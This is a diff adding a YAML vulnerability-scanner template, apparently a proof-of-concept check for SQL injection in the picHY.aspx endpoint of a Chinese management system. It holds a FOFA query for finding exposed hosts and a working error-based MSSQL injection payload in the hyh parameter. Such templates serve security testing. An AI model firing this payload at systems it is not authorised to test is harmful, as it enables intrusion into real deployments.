@@ -1,0 +1,17 @@
+id: poc-yaml-jiu-jia-yi-ms-pichy-ashx-sqli
+info:
+  name: 九佳易管理系统 picHY.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 九佳易管理系统
+  fofa: title="VSQL" && body="/Scripts/Login_A8/"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /HuiYuan/HuiYuanDangAn/picHY.aspx?hyh=1'+AND+1234+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))--
+  expression: status_code == 500 && contains(body,"0x" + t2) && contains(body,"SqlException:")
+    && contains(body,".picHY") && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+transport: http
